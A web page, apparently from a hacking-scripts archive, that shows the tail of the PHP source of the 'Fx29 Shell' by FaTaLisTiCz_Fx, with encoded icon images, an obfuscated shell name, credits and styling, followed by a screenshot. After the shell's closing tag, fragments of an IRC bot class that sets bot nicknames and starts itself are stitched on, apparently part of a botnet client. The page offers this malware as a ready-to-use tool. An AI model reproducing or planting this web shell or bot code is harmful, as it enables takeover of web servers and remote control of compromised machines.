<span class="s1">&#39;SAoR8nAARcZ4rQkr68VCI1nTB4Vj0H1iALzwpIUY3FXOKb4UwYSqDODmY+ROREtmkEFNhqKRyfV7&#39;</span><span class="o">.</span>
<span class="s1">&#39;SFzHEQR62qSAnBxJoVSlxhRJLEZJAAA7&#39;</span><span class="p">,</span>
  <span class="s2">&quot;ext_lnk&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEAAQAKIHAAAFACOPE2TNNj60IQRKAojuVgdlBAAAACH5BAHoAwcALAAAAAAQABAAAANO&#39;</span><span class="o">.</span>
<span class="s1">&#39;eGfcbkCpQOu4AkZlLM5AKHlCqW3TVw4hmqqlKB3UKhQF6AZ2ibM7Ew+Xk6UIoQAROAsgQ4RbIWBc&#39;</span><span class="o">.</span>
<span class="s1">&#39;tBbSq0RruD1dB1S3BZ5ZteYZ2ZwAADs=&#39;</span><span class="p">,</span>
  <span class="s2">&quot;ext_log&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA&quot;</span><span class="o">.</span>
  <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wN&quot;</span><span class="o">.</span>
  <span class="s2">&quot;zLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_php&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEAAQAIABAP///////yH5BAHoAwEALAAAAAAQABAAAAIohI8Jwe0Po5wNsRWWxbl3blSe&#39;</span><span class="o">.</span>
<span class="s1">&#39;VmHmMWZouj2md7kxB8cfhec6pPRHAQA7&#39;</span><span class="p">,</span>
  <span class="s2">&quot;ext_pl&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo&quot;</span><span class="o">.</span>
  <span class="s2">&quot;GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_swf&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O&quot;</span><span class="o">.</span>
  <span class="s2">&quot;nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA&quot;</span><span class="o">.</span>
  <span class="s2">&quot;ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA&quot;</span><span class="o">.</span>
  <span class="s2">&quot;GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC&quot;</span><span class="o">.</span>
  <span class="s2">&quot;NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_tar&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEAAQAKIFABokHymwoKiYkKIYbdzo4wAAAAAAAAAAACH5BAHoAwUALAAAAAAQABAAAAM4&#39;</span><span class="o">.</span>
<span class="s1">&#39;CLrcJVCMSesAJJOhY7waAUgWhWljo67rE7FMGGhzYNtnNt48HsJAlgsSzIlovYAxlfShBMVoIQEA&#39;</span><span class="o">.</span>
<span class="s1">&#39;Ow==&#39;</span><span class="p">,</span>
  <span class="s2">&quot;ext_txt&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhCwAQAKIFACoqKqCeoO/z83d2brO2vwAAAAAAAAAAACH5BAHoAwUALAAAAAALABAAAAM5&#39;</span><span class="o">.</span>
<span class="s1">&#39;CLM8MSBIJwNZJAhNRBdDR3xCCYqkGXppuZrwuVWj21mVJo+jZG812Cv288VWD+KQtQA4m4CCdJoA&#39;</span><span class="o">.</span>
<span class="s1">&#39;ADs=&#39;</span><span class="p">,</span>
  <span class="s2">&quot;ext_wri&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA&quot;</span><span class="o">.</span>
  <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao&quot;</span><span class="o">.</span>
  <span class="s2">&quot;a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_xml&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA&quot;</span><span class="o">.</span>
  <span class="s2">&quot;gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
  <span class="s2">&quot;AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx&quot;</span><span class="o">.</span>
  <span class="s2">&quot;OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ&quot;</span><span class="o">.</span>
  <span class="s2">&quot;IQA7&quot;</span>
  <span class="p">);</span>
  <span class="k">return</span> <span class="nv">$images</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">sh_name</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s2">&quot;RmFUYUxpc1RpQ3pfRnggRngyOVNoZUxMIHY=&quot;</span><span class="p">)</span><span class="o">.</span><span class="nx">sh_ver</span><span class="p">;</span> <span class="p">}</span>
<span class="k">function</span> <span class="nf">fx29sh_tools</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=</span><span class="se">\&quot;</span><span class="s2">barheader</span><span class="se">\&quot;</span><span class="s2">&amp;gt;.: TooLz :.&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">fx29sh_about</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=</span><span class="se">\&quot;</span><span class="s2">barheader</span><span class="se">\&quot;</span><span class="s2">&amp;gt;.: Credits :.&amp;lt;/div&amp;gt;&quot;</span><span class="o">.</span>
       <span class="s2">&quot;Idea, leader &amp; coder: &amp;lt;b&amp;gt;tristram [CCTeaM]&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span>
       <span class="s2">&quot;Beta-tester &amp; tips: &amp;lt;b&amp;gt;NukLeoN [AnTiSh@Re tEaM]&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span>
       <span class="s2">&quot;Re-coder, Designer, Windows Fix, PHP Mailer &amp; PHP Filesystem: &amp;lt;b&amp;gt;FaTaLisTiCz_Fx [FeeLCoMz CoMMuNiTy]&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span>
       <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span>
       <span class="s2">&quot;Please report bugs to &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">mailto:yankeemoore55@gmail.com</span><span class="se">\&quot;</span><span class="s2">&amp;gt;FaTaLisTiCz_Fx&amp;lt;/a&amp;gt;&amp;lt;/b&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">html_style</span><span class="p">()</span> <span class="p">{</span>
<span class="nv">$style</span> <span class="o">=</span> <span class="s1">&#39;&amp;lt;html&amp;gt;</span>
<span class="s1">&amp;lt;head&amp;gt;</span>
<span class="s1">    &amp;lt;style&amp;gt;</span>
<span class="s1">        table {width: 100%;border-collapse: collapse;}</span>
<span class="s1">        #main, #maininfo {width: 900px;}</span>
<span class="s1">        body, table, input, select, option, .info</span>
<span class="s1">        {</span>
<span class="s1">            font: 8pt tahoma;</span>
<span class="s1">        }</span>
<span class="s1">        .footer {font: 7pt tahoma;}</span>
<span class="s1">        textarea, .code</span>
<span class="s1">        {</span>
<span class="s1">            font: 8pt Courier New;</span>
<span class="s1">            color: #dedbde;</span>
<span class="s1">            border: 1px solid #666666;</span>
<span class="s1">        }</span>
<span class="s1">        img {border: 0;}</span>
<span class="s1">        #maininfo img {width: 16;height: 16;}</span>
<span class="s1">        input, select, option {border: 1px solid #606060;}</span>
<span class="s1">        #maininfo, td, th {border: 1px solid #3F3F3F;}</span>
<span class="s1">        a {color: #5B5BFF;text-decoration: none;}</span>
<span class="s1">        #pagebar a, .barheader a {color: #00FF00;}</span>
<span class="s1">        a:hover, #pagebar a:hover {color: #3366FF;}</span>
<span class="s1">        .on {color: #00FF00;}</span>
<span class="s1">        .off, .errmsg {color: #FF0000;}</span>
<span class="s1">        body, table, input, select, option {color : #EEEEEE;}</span>
<span class="s1">        .info th {color: #969696;width: 13%;}</span>
<span class="s1">        .shell {font-size: 12;color: #C0C0C0;border: 0;}</span>
<span class="s1">        #pagebar a, .barheader, .errmsg, .on, .off</span>
<span class="s1">        {</span>
<span class="s1">            font-weight: bold;</span>
<span class="s1">        }</span>
<span class="s1">        p, form, .info, .info td, .info th, .explorer *</span>
<span class="s1">        {</span>
<span class="s1">            margin: 0;</span>
<span class="s1">        }</span>
<span class="s1">        input, #maininfo {margin: 3px;}</span>
<span class="s1">        #mainpanel input, #mainpanel select</span>
<span class="s1">        {</span>
<span class="s1">          margin: 0px 2px 0px 2px;</span>
<span class="s1">        }</span>
<span class="s1">        #maininfo table, select {margin: 2px 0px 2px 0px;}</span>
<span class="s1">        #pagebar, .bartitle, #mainpanel {background: #474747;}</span>
<span class="s1">        body, textarea, .shell, input, select, option</span>
<span class="s1">        {</span>
<span class="s1">            background: #000000;</span>
<span class="s1">        }</span>
<span class="s1">        .info, .info th, .info td, input[type=&quot;label&quot;]</span>
<span class="s1">        {</span>
<span class="s1">            background: transparent;</span>
<span class="s1">            border: 0;</span>
<span class="s1">        }</span>
<span class="s1">        #pagebar td, #mainpanel td, #mainpanel th, .contents th, .explorer td</span>
<span class="s1">        {</span>
<span class="s1">            border-left: 0;</span>
<span class="s1">            border-right: 0;</span>
<span class="s1">        }</span>
<span class="s1">        .bartitle, .barheader, input[type=&quot;submit&quot;], input[type=&quot;button&quot;], input[type=&quot;reset&quot;]</span>
<span class="s1">        {</span>
<span class="s1">            color: #D0D0D0;</span>
<span class="s1">            background: #3F3F3F;</span>
<span class="s1">            border: 1px solid #202020;</span>
<span class="s1">            border-top: 1px solid #505050;</span>
<span class="s1">            border-left: 1px solid #505050;</span>
<span class="s1">        }</span>
<span class="s1">        input[type=&quot;submit&quot;]:hover, input[type=&quot;button&quot;]:hover, input[type=&quot;reset&quot;]:hover</span>
<span class="s1">        {</span>
<span class="s1">            color: #00FF00;</span>
<span class="s1">            background: #333333;</span>
<span class="s1">        }</span>
<span class="s1">        td, .info th {vertical-align: top;}</span>
<span class="s1">        .explorer td {vertical-align: middle;}</span>
<span class="s1">        .fleft {float: left;}</span>
<span class="s1">        .fright {float: right;}</span>
<span class="s1">        .code, .fleft, .info th {text-align: left;}</span>
<span class="s1">        .fright, input[type=&quot;label&quot;], #mainpanel th, .contents th</span>
<span class="s1">        {</span>
<span class="s1">            text-align: right;</span>
<span class="s1">        }</span>
<span class="s1">        #maininfo, .bartitle, .quicklaunch, .quicklaunch a, .barheader, th</span>
<span class="s1">        {</span>
<span class="s1">            text-align: center;</span>
<span class="s1">        }</span>
<span class="s1">        td, textarea, input[type=&quot;text&quot;], .bartitle, .barheader, .code, th</span>
<span class="s1">        {</span>
<span class="s1">            padding: 3px;</span>
<span class="s1">        }</span>
<span class="s1">        .info th, .info td {padding: 0px 2px 0px 2px;}</span>
<span class="s1">        .quicklaunch a {padding : 0px 5px 0px 5px;}</span>
<span class="s1">    &amp;lt;/style&amp;gt;</span>
<span class="s1">    &amp;lt;title&amp;gt;&#39;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; - &#39;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/title&amp;gt;</span>
<span class="s1">&amp;lt;/head&amp;gt;</span>
<span class="s1">&amp;lt;body&amp;gt;&amp;lt;center&amp;gt;</span>
<span class="s1">&#39;</span><span class="p">;</span>
<span class="k">return</span> <span class="nv">$style</span><span class="p">;</span>
<span class="p">};</span>
<span class="k">function</span> <span class="nf">html_header</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;.: No System is Perfectly Safe :.&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="k">function</span> <span class="nf">html_footer</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&amp;copy; 2008 By FaTaLisTiCz_Fx, FeeLCoMz Community. Generated: &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nx">starttime</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; seconds&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="k">function</span> <span class="nf">disp_error</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=errmsg&amp;gt;</span><span class="si">$msg</span><span class="s2">&amp;lt;/div&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="k">function</span> <span class="nf">srv_info</span><span class="p">(</span><span class="nv">$title</span><span class="p">,</span><span class="nv">$contents</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;</span><span class="si">$title</span><span class="s2">&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;</span><span class="si">$contents</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="k">function</span> <span class="nf">srv_software</span><span class="p">(</span><span class="nv">$surl</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$srv_software</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_SOFTWARE&quot;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">(),</span><span class="nv">$srv_software</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$srv_software</span> <span class="o">.=</span> <span class="s2">&quot;. PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">();</span> <span class="p">}</span>
  <span class="k">return</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">(),</span><span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=phpinfo</span><span class="se">\&quot;</span><span class="s2"> target=</span><span class="se">\&quot;</span><span class="s2">_blank</span><span class="se">\&quot;</span><span class="s2">&amp;gt;PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">,</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$srv_software</span><span class="p">));</span>
<span class="p">}</span>
<span class="c1">####################################</span>
<span class="c1">###[ END OF FUNCTIONS ]###</span>
<span class="c1">####################################</span>
<span class="nb">chdir</span><span class="p">(</span><span class="nv">$lastdir</span><span class="p">);</span> <span class="nx">fx29shexit</span><span class="p">();</span>
<span class="c1">#######################################</span>
<span class="c1">###[ FeeLCoMz Community ]###</span>
<span class="c1">#######################################</span>
<span class="cp">?&gt;</span><span class="x">         }</span>

<span class="x">         function busk_nick()</span>

<span class="x">         {</span>

<span class="x">            $prefix .= &quot;[RooT|LinuX|&quot;;</span>

<span class="x">            $random_number = &quot;&quot;;</span>

<span class="x">            for( $i = 0; $i &amp;lt; $this-&amp;gt;config[ &#39;maxrand&#39; ]; $i++ )</span>

<span class="x">            {</span>

<span class="x">                $random_number .= mt_rand( 0, 9 );</span>

<span class="x">            }</span>
<span class="x">            $this-&amp;gt;nick = sprintf( $prefix.$this-&amp;gt;config[ &#39;nickform2&#39; ], $random_number );</span>

<span class="x">            $this-&amp;gt;send(&quot;NICK &quot;.$this-&amp;gt;nick);</span>

<span class="x">         }</span>

<span class="x">         function nzm_nick()</span>

<span class="x">         {</span>

<span class="x">            $prefix .= &quot;[USA|&quot;;</span>

<span class="x">            $random_number = &quot;&quot;;</span>

<span class="x">            for( $i = 0; $i &amp;lt; $this-&amp;gt;config[ &#39;maxrand&#39; ]; $i++ )</span>

<span class="x">            {</span>

<span class="x">                $random_number .= mt_rand( 0, 9 );</span>

<span class="x">            }</span>

<span class="x">            $ffffu = &quot;$this-&amp;gt;config[ &#39;prfix&#39; ]&quot;;</span>

<span class="x">            $this-&amp;gt;nick = sprintf( $prefix.$this-&amp;gt;config[&#39;prfix&#39;], $random_number );</span>

<span class="x">            $this-&amp;gt;send(&quot;NICK &quot;.$this-&amp;gt;nick);</span>

<span class="x">         }</span>
<span class="x">        function parse_url_s( $url )</span>

<span class="x">        {</span>

<span class="x">            $URLpcs = ( parse_url( $url ) );</span>

<span class="x">            $PathPcs = explode( &quot;/&quot;, $URLpcs[&#39;path&#39;] );</span>

<span class="x">            $URLpcs[&#39;file&#39;] = end( $PathPcs );</span>

<span class="x">            unset( $PathPcs[ key( $PathPcs ) ] );</span>

<span class="x">            $URLpcs[&#39;dir&#39;] = implode(&quot;/&quot;,$PathPcs);</span>
<span class="x">            $fileext = explode( &#39;.&#39;, $URLpcs[&#39;file&#39;] );</span>
<span class="x">            if(count($fileext))</span>

<span class="x">            {</span>

<span class="x">                $URLpcs[&#39;file_ext&#39;] = $fileext[ count( $fileext ) - 1 ];</span>

<span class="x">            }</span>
<span class="x">            return ($URLpcs);</span>

<span class="x">        }</span>

<span class="x">    }</span>
<span class="x">    $bot = new Mike_Unix;</span>

<span class="x">    $bot-&amp;gt;start();</span>
<span class="x">?&gt;</span></code></pre></div>

<h3>FaTaLisTiCz_Fx Fx29 Shell Screenshot</h3>

<p><a href="/HackingScripts/wp-content/uploads/2014/01/FX.png"><img src="/HackingScripts/wp-content/uploads/2014/01/FX-1024x499.png" alt="FaTaLisTiCz_Fx Shell screenshot" width="604" height="294" class="aligncenter size-large wp-image-329" /></a></p>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
